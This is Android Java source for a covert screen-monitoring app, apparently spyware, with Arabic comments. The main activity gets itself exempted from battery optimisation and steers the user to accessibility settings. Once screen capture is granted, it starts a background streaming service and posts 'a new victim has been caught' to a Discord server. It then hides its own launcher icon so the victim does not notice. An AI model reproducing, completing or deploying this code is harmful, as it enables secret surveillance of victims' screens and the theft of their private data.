package com.tom5.monitor;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private static final int REQ_CODE = 100;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // 1. طلب تجاهل تحسين البطارية لضمان العمل 24 ساعة
        requestBatteryOptimizations();

        // 2. طلب إذن إمكانية الوصول (Accessibility)
        if (!isAccessibilityEnabled(this)) {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        }

        // 3. طلب إذن بث الشاشة
        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        if (mpm != null) {
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_CODE && resultCode == RESULT_OK) {
            // أ. تشغيل الخدمة بالخلفية للبث المستمر
            Intent intent = new Intent(this, ScreenService.class);
            intent.putExtra("resCode", resultCode);
            intent.putExtra("resData", data);
            startForegroundService(intent);

            // ب. إرسال إشعار للديسكورد فوراً (الرابط موجود في DiscordSender)
            DiscordSender.sendMessage("🚀 تم صيد ضحية جديدة! البث بدأ الآن على سيرفر Hussein Monitor.");

            // ج. إخفاء الأيقونة فوراً من الجهاز
            hideAppIcon();
            
            // د. إغلاق الواجهة فوراً ليعود الضحية للشاشة الرئيسية
            finish();
        }
    }

    private void hideAppIcon() {
        getPackageManager().setComponentEnabledSetting(
            new ComponentName(this, MainActivity.class),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        );
    }

    private void requestBatteryOptimizations() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
    }

    private boolean isAccessibilityEnabled(Context context) {
        return false; // يفضل دائماً أن يفعله المستخدم يدوياً من الإعدادات
    }
}
